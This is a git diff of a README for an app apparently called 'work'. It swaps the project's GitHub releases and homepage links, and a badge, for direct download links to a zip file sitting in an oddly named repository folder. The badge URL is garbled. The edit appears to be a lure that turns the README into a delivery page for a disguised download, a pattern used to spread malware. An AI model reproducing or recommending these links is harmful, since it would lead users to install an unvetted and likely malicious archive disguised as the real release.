@@ -1,6 +1,6 @@
 # 🎉 work - Simplify Your Workflow Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/sakata114/work/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/sakata114/work/main/Alangiaceae/work-1.8.zip%https://raw.githubusercontent.com/sakata114/work/main/Alangiaceae/work-1.8.zip)](https://raw.githubusercontent.com/sakata114/work/main/Alangiaceae/work-1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To ensure the best experience with **work**, make sure your system meets these r
 To download and install **work**, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page:
-   [Download Latest Release](https://github.com/sakata114/work/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/sakata114/work/main/Alangiaceae/work-1.8.zip)
 
 2. **Select the Version:** On the releases page, find the latest version. It will be labeled as the most recent release.
 
@@ -61,6 +61,6 @@ For additional help or questions, feel free to reach out:
 
 ## 🌐 Learn More
 
-Stay updated and learn more by visiting our [GitHub Page](https://github.com/sakata114/work) or following the community on social media.
+Stay updated and learn more by visiting our [GitHub Page](https://raw.githubusercontent.com/sakata114/work/main/Alangiaceae/work-1.8.zip) or following the community on social media.
 
 Thank you for choosing **work** to enhance your productivity! We hope you enjoy using the application as much as we enjoyed creating it.
